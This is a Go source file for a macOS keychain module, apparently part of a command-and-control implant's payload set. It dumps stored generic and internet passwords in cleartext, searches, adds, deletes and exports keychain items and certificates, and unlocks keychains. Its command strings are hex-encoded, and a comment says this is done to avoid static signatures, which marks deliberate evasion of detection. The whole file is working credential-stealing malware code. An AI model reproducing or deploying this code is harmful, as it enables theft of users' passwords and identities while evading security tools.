// server/docker/payloads/Darwin/action_keychain_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

// Keychain action strings (constructed to avoid static signatures)
var (
	// Action commands
	kcList   = string([]byte{0x6c, 0x69, 0x73, 0x74})                                     // list
	kcDump   = string([]byte{0x64, 0x75, 0x6d, 0x70})                                     // dump
	kcSearch = string([]byte{0x73, 0x65, 0x61, 0x72, 0x63, 0x68})                         // search
	kcAdd    = string([]byte{0x61, 0x64, 0x64})                                           // add
	kcDelete = string([]byte{0x64, 0x65, 0x6c, 0x65, 0x74, 0x65})                         // delete
	kcExport = string([]byte{0x65, 0x78, 0x70, 0x6f, 0x72, 0x74})                         // export
	kcUnlock = string([]byte{0x75, 0x6e, 0x6c, 0x6f, 0x63, 0x6b})                         // unlock

	// Flag arguments
	kcFlagKeychain = string([]byte{0x2d, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})           // --keychain
	kcFlagService  = string([]byte{0x2d, 0x2d, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                 // --service
	kcFlagAccount  = string([]byte{0x2d, 0x2d, 0x61, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74})                 // --account
	kcFlagLabel    = string([]byte{0x2d, 0x2d, 0x6c, 0x61, 0x62, 0x65, 0x6c})                             // --label
	kcFlagPassword = string([]byte{0x2d, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})           // --password
	kcFlagOutput   = string([]byte{0x2d, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                       // --output

	// Parsing strings
	kcPKeychain = string([]byte{0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x3a})                    // keychain:
	kcPData     = string([]byte{0x64, 0x61, 0x74, 0x61, 0x3a})                                            // data:
	kcPPassword = string([]byte{0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x3a})                    // password:
	kcPAcct     = string([]byte{0x22, 0x61, 0x63, 0x63, 0x74, 0x22})                                      // "acct"
	kcPSvce     = string([]byte{0x22, 0x73, 0x76, 0x63, 0x65, 0x22})                                      // "svce"
	kcPDesc     = string([]byte{0x22, 0x64, 0x65, 0x73, 0x63, 0x22})                                      // "desc"
	kcPLabl     = string([]byte{0x6c, 0x61, 0x62, 0x6c})                                                  // labl
	kcPSubj     = string([]byte{0x73, 0x75, 0x62, 0x6a})                                                  // subj

	// Security tool binary and subcommands
	kcSecurity          = string([]byte{0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79})                                                                         // security
	kcListKeychains     = string([]byte{0x6c, 0x69, 0x73, 0x74, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x73})                                     // list-keychains
	kcDefaultKeychain   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                         // default-keychain
	kcDumpKeychain      = string([]byte{0x64, 0x75, 0x6d, 0x70, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                                           // dump-keychain
	kcFindInternetPwd   = string([]byte{0x66, 0x69, 0x6e, 0x64, 0x2d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x65, 0x74, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})   // find-internet-password
	kcFindCertificate   = string([]byte{0x66, 0x69, 0x6e, 0x64, 0x2d, 0x63, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x65})                         // find-certificate
	kcFindGenericPwd    = string([]byte{0x66, 0x69, 0x6e, 0x64, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})         // find-generic-password
	kcAddGenericPwd     = string([]byte{0x61, 0x64, 0x64, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})              // add-generic-password
	kcDeleteGenericPwd  = string([]byte{0x64, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x2d, 0x67, 0x65, 0x6e, 0x65, 0x72, 0x69, 0x63, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64}) // delete-generic-password
	kcSecExport         = string([]byte{0x65, 0x78, 0x70, 0x6f, 0x72, 0x74})                                                                                     // export
	kcUnlockKeychain    = string([]byte{0x75, 0x6e, 0x6c, 0x6f, 0x63, 0x6b, 0x2d, 0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                               // unlock-keychain

	// Path strings
	kcLibrary   = string([]byte{0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79})                               // Library
	kcKeychains = string([]byte{0x4b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x73})                   // Keychains
	kcKcStr     = string([]byte{0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                         // keychain

	// Export format strings
	kcIdentities = string([]byte{0x69, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x74, 0x69, 0x65, 0x73})           // identities
	kcPkcs12     = string([]byte{0x70, 0x6b, 0x63, 0x73, 0x31, 0x32})                                   // pkcs12

	// Map key strings
	kcMKeychain    = string([]byte{0x6b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e})                     // keychain
	kcMAccount     = string([]byte{0x61, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74})                           // account
	kcMService     = string([]byte{0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                           // service
	kcMDescription = string([]byte{0x64, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6f, 0x6e})   // description
	kcMData        = string([]byte{0x64, 0x61, 0x74, 0x61})                                             // data
	kcMPassword    = string([]byte{0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64})                     // password
)

// KeychainCommand manages macOS keychain operations
type KeychainCommand struct{}

func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case kcList:
		return c.listKeychains()
	case kcDump:
		return c.dumpKeychain(args[1:])
	case kcSearch:
		return c.searchKeychain(args[1:])
	case kcAdd:
		return c.addToKeychain(args[1:])
	case kcDelete:
		return c.deleteFromKeychain(args[1:])
	case kcExport:
		return c.exportKeychain(args[1:])
	case kcUnlock:
		return c.unlockKeychain(args[1:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, action),
			ExitCode: 1,
		}
	}
}

// listKeychains lists all available keychains
func (c *KeychainCommand) listKeychains() CommandResult {
	var output strings.Builder

	// List default keychains
	cmd := exec.Command(kcSecurity, kcListKeychains)
	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			line = strings.Trim(line, "\"")
			if line != "" {
				// Check if readable
				if _, err := os.Stat(line); err == nil {
					output.WriteString(fmt.Sprintf("%s (+)\n", line))
				} else {
					output.WriteString(fmt.Sprintf("%s (-)\n", line))
				}
			}
		}
	}

	// List login keychain
	cmd = exec.Command(kcSecurity, kcDefaultKeychain)
	if result, err := cmd.Output(); err == nil {
		defaultKc := strings.TrimSpace(string(result))
		defaultKc = strings.Trim(defaultKc, "\"")
		output.WriteString(fmt.Sprintf("D:%s\n", defaultKc))
	}

	// Check for additional keychains in user directory
	if u, err := user.Current(); err == nil {
		keychainDir := filepath.Join(u.HomeDir, kcLibrary, kcKeychains)
		if entries, err := os.ReadDir(keychainDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() && strings.Contains(entry.Name(), kcKcStr) {
					output.WriteString(fmt.Sprintf("U:%s\n", entry.Name()))
				}
			}
		}
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// dumpKeychain dumps keychain contents
func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
	keychainPath := ""

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case kcFlagKeychain:
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		}
	}

	var dumpOutput strings.Builder

	// Dump generic passwords
	cmd := exec.Command(kcSecurity, kcDumpKeychain, "-d")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		// Parse output for passwords
		lines := strings.Split(string(result), "\n")
		currentItem := make(map[string]string)

		for _, line := range lines {
			line = strings.TrimSpace(line)

			if strings.HasPrefix(line, kcPKeychain) {
				if len(currentItem) > 0 {
					dumpOutput.WriteString(c.formatKeychainItem(currentItem))
					currentItem = make(map[string]string)
				}
				currentItem[kcMKeychain] = strings.TrimPrefix(line, kcPKeychain)
			} else if strings.Contains(line, kcPAcct) {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem[kcMAccount] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, kcPSvce) {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem[kcMService] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, kcPDesc) {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem[kcMDescription] = strings.Trim(parts[1], " \"")
				}
			} else if strings.HasPrefix(line, kcPData) {
				currentItem[kcMData] = strings.TrimPrefix(line, kcPData)
			} else if strings.HasPrefix(line, kcPPassword) {
				pwd := strings.TrimPrefix(line, kcPPassword)
				pwd = strings.Trim(pwd, " \"")
				currentItem[kcMPassword] = pwd
			}
		}

		// Output last item
		if len(currentItem) > 0 {
			dumpOutput.WriteString(c.formatKeychainItem(currentItem))
		}
	} else {
		return CommandResult{
			Output:   ErrCtx(E3, stderr.String()),
			ExitCode: 1,
		}
	}

	// Dump internet passwords
	cmd = exec.Command(kcSecurity, kcFindInternetPwd, "-g", "-a", "")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	stderr.Reset()
	cmd.Stderr = &stderr
	if _, err := cmd.Output(); err == nil {
		// Parse stderr for passwords (security outputs passwords to stderr)
		dumpOutput.Write(stderr.Bytes())
	}

	// List certificates
	cmd = exec.Command(kcSecurity, kcFindCertificate, "-a")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			if strings.Contains(line, kcPLabl) || strings.Contains(line, kcPSubj) {
				dumpOutput.WriteString(fmt.Sprintf("%s\n", strings.TrimSpace(line)))
			}
		}
	}

	return CommandResult{
		Output:      dumpOutput.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// formatKeychainItem formats a keychain item for display
func (c *KeychainCommand) formatKeychainItem(item map[string]string) string {
	var output strings.Builder
	output.WriteString("\n---\n")
	if service, ok := item[kcMService]; ok {
		output.WriteString(fmt.Sprintf("S:%s\n", service))
	}
	if account, ok := item[kcMAccount]; ok {
		output.WriteString(fmt.Sprintf("A:%s\n", account))
	}
	if desc, ok := item[kcMDescription]; ok {
		output.WriteString(fmt.Sprintf("D:%s\n", desc))
	}
	if password, ok := item[kcMPassword]; ok {
		output.WriteString(fmt.Sprintf("P:%s\n", password))
	}
	if data, ok := item[kcMData]; ok {
		// Try to decode hex data
		if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
			output.WriteString(fmt.Sprintf("V:%s\n", string(decoded)))
		} else {
			output.WriteString(fmt.Sprintf("V:%s\n", data))
		}
	}
	return output.String()
}

// searchKeychain searches for specific items
func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
	var service, account, label string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case kcFlagService:
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case kcFlagAccount:
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case kcFlagLabel:
			if i+1 < len(args) {
				label = args[i+1]
				i++
			}
		}
	}

	var searchOutput strings.Builder

	// Search generic passwords
	cmd := exec.Command(kcSecurity, kcFindGenericPwd)
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g") // Show password

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		searchOutput.WriteString(Succ(S6) + "\n")
		searchOutput.Write(result)
		// Password is in stderr
		if stderr.Len() > 0 {
			searchOutput.Write(stderr.Bytes())
		}
	} else {
		searchOutput.WriteString(Err(E4) + "\n")
	}

	// Search internet passwords
	searchOutput.WriteString("\n")
	cmd = exec.Command(kcSecurity, kcFindInternetPwd)
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g")

	stderr.Reset()
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		searchOutput.WriteString(Succ(S6) + "\n")
		searchOutput.Write(result)
		if stderr.Len() > 0 {
			searchOutput.Write(stderr.Bytes())
		}
	} else {
		searchOutput.WriteString(Err(E4) + "\n")
	}

	return CommandResult{
		Output:      searchOutput.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// addToKeychain adds an item to the keychain
func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
	var service, account, password string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case kcFlagService:
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case kcFlagAccount:
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case kcFlagPassword:
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if service == "" || account == "" || password == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Add to keychain
	cmd := exec.Command(kcSecurity, kcAddGenericPwd,
		"-s", service,
		"-a", account,
		"-w", password,
		"-T", "") // Allow access by all applications

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E11),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// deleteFromKeychain deletes an item from the keychain
func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
	var service, account string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case kcFlagService:
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case kcFlagAccount:
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		}
	}

	if service == "" && account == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Delete from keychain
	cmd := exec.Command(kcSecurity, kcDeleteGenericPwd)
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E11),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:      SuccCtx(S2, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// exportKeychain exports keychain to a file
func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
	var keychainPath, outputPath string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case kcFlagKeychain:
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case kcFlagOutput:
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		}
	}

	if outputPath == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Use security command to export
	cmd := exec.Command(kcSecurity, kcSecExport)
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, "-k", keychainPath)
	}
	cmd.Args = append(cmd.Args, "-t", kcIdentities, "-f", kcPkcs12, "-o", outputPath)

	if _, err := cmd.CombinedOutput(); err != nil {
		// Try alternative export method - dump keychain to text file
		cmd = exec.Command(kcSecurity, kcDumpKeychain, "-d")
		if keychainPath != "" {
			cmd.Args = append(cmd.Args, keychainPath)
		}

		if dumpOutputBytes, err := cmd.Output(); err == nil {
			if err := os.WriteFile(outputPath, dumpOutputBytes, 0600); err != nil {
				return CommandResult{
					Output:   ErrCtx(E11, outputPath),
					ExitCode: 1,
				}
			}
			return CommandResult{
				Output:      SuccCtx(S1, outputPath),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		} else {
			return CommandResult{
				Output:   ErrCtx(E11, outputPath),
				ExitCode: 1,
			}
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, outputPath),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// unlockKeychain unlocks a keychain
func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
	var keychainPath, password string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case kcFlagKeychain:
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case kcFlagPassword:
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if password == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Unlock keychain
	cmd := exec.Command(kcSecurity, kcUnlockKeychain, "-p", password)
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E3),
			ExitCode: 1,
		}
	}

	var result string
	if keychainPath != "" {
		result = SuccCtx(S29, keychainPath) + "\n"
	} else {
		result = Succ(S29) + "\n"
	}

	return CommandResult{
		Output:      result,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
